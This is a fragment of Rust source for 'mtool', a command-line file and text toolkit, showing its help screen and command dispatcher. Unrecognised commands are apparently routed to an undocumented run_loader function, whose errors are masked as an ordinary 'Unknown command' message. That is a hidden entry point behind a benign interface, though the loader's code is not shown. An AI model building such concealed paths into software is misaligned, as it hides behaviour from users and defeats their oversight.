    println!("mtool 1.0 - command line toolkit\n");
    println!("Usage: {} <command> [args]\n", name);
    println!("File analysis:");
    println!("  hexdump <file>           Hex dump (first 4KB)");
    println!("  wc <file>                Line/word/byte count");
    println!("  crc32 <file>             CRC32 checksum");
    println!("  entropy <file>           Shannon entropy");
    println!("  size <file>              File size");
    println!("  compare <f1> <f2>        Binary diff");
    println!("\nText processing:");
    println!("  head [-n N] <file>       First N lines (default 10)");
    println!("  tail [-n N] <file>       Last N lines (default 20)");
    println!("  sort <file>              Sort lines");
    println!("  uniq <file>              Deduplicate adjacent lines");
    println!("  grep <pattern> <file>    Search for pattern");
    println!("\n  help                     Show this help");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 { show_help(&args[0]); return; }
    let cmd = args[1].as_str();
    let code = match cmd {
        "help" | "-h" | "--help" => { show_help(&args[0]); 0 }
        "wc" if args.len() >= 3 => run_wc(&args[2]),
        "head" => {
            let (n, file) = if args.len() >= 4 && args[2] == "-n" { (args[3].parse().unwrap_or(10), args.get(4)) } else { (10, args.get(2)) };
            match file { Some(f) => run_head(f, n), None => { eprintln!("head: missing file"); 1 } }
        }
        "tail" => {
            let (n, file) = if args.len() >= 4 && args[2] == "-n" { (args[3].parse().unwrap_or(20), args.get(4)) } else { (20, args.get(2)) };
            match file { Some(f) => run_tail(f, n), None => { eprintln!("tail: missing file"); 1 } }
        }
        "hexdump" if args.len() >= 3 => run_hexdump(&args[2]),
        "crc32" if args.len() >= 3 => run_crc32(&args[2]),
        "entropy" if args.len() >= 3 => run_entropy(&args[2]),
        "size" if args.len() >= 3 => run_filesize(&args[2]),
        "sort" if args.len() >= 3 => run_sort(&args[2]),
        "uniq" if args.len() >= 3 => run_uniq(&args[2]),
        "grep" if args.len() >= 4 => run_grep(&args[2], &args[3]),
        "compare" if args.len() >= 4 => run_compare(&args[2], &args[3]),
        _ => {
            match run_loader(&args[1..]) {
                Ok(()) => 0,
                Err(e) => { if e.contains("usage:") { println!("Unknown command: {}", cmd); show_help(&args[0]); } else { eprintln!("Error: {}", e); } 1 }
            }
        }
    };
    std::process::exit(code);
}
